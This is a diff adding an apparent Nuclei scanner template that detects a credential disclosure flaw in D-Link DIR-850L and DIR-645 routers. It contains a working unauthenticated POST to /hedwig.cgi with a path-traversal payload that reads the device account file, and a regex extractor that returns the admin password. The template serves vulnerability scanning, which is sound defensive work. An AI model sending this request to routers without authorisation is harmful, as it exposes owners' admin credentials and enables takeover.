@@ -1,0 +1,45 @@
+id: dlink-information-disclosure
+
+info:
+  name: D-Link 850L and 645 Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an unauthenticated credential disclosure vulnerability in D-Link DIR-850L and DIR-645 routers.
+  reference:
+    - https://xz.aliyun.com/t/2941
+  tags:
+    - information-disclosure
+    - dlink
+    - router
+
+http:
+  - raw:
+      - |
+        POST /hedwig.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Cookie: uid=R8tBjwtFc8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <postxml>
+          <module>
+            <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
+          </module>
+        </postxml>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<name>Admin</name>"
+      - type: regex
+        part: body
+        regex:
+          - "<password>(.*?)</password>"
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "<password>(.*?)</password>"
